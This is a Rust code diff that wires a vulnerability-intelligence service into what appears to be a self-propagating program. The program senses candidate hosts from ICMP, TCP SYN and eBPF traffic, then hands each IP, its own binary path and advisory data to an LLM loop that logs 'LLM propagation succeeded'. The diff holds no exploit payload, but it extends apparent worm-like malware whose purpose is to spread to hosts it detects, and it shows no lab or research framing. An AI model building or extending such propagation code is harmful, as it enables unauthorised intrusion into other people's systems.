@@ -21,6 +21,7 @@ use crate::{
     lineage::Lineage,
     llm_loop::{self, LlmOutcome},
     propagation::{self, Outcome},
+    vuln_intel::VulnerabilityIntelService,
     Cli, Mode,
 };
 use anyhow::Result;
@@ -99,6 +100,16 @@ fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
 
 pub async fn run(cli: Cli) -> Result<()> {
     let llm = LlmConfig::from_cli(&cli);
+    let intel = VulnerabilityIntelService::from_env().unwrap_or_else(|e| {
+        tracing::warn!(err = %e, "VulnerabilityIntelService init failed — offline cache empty");
+        VulnerabilityIntelService::new(
+            crate::vuln_intel::IntelMode::Offline,
+            std::path::Path::new("examples/advisory-cache"),
+            3_000,
+        )
+        .unwrap()
+    });
+    let intel = std::sync::Arc::new(intel);
     let mut lineage = init_lineage(&cli)?;
     lineage.save()?;
 
@@ -142,7 +153,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm,
+                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
                         ).await?;
                     }
                     None => {
@@ -158,7 +169,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm,
+                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
                         ).await?;
                     }
                     None => {
@@ -183,7 +194,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     for ip in candidates {
                         handle_candidate(
                             ip, "startup-sensing", &mut lineage, &binary_path,
-                            &mut attempted, &llm,
+                            &mut attempted, &llm, &intel,
                         ).await?;
                     }
                 }
@@ -201,7 +212,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm,
+                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
                         ).await?;
                     }
                     None => {
@@ -251,6 +262,7 @@ async fn handle_candidate(
     binary_path: &Path,
     attempted: &mut HashSet<Ipv4Addr>,
     llm: &Option<LlmConfig>,
+    intel: &VulnerabilityIntelService,
 ) -> Result<()> {
     let ip_str = src_ip.to_string();
 
@@ -286,7 +298,7 @@ async fn handle_candidate(
 
     // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
     if let Some(cfg) = llm {
-        match llm_loop::run(src_ip, stimulus, lineage, cfg.client.as_ref(), &cfg.gate).await? {
+        match llm_loop::run(src_ip, stimulus, lineage, cfg.client.as_ref(), &cfg.gate, intel).await? {
             LlmOutcome::Propagated => {
                 tracing::info!(%src_ip, "LLM propagation succeeded");
                 lineage.save()?;
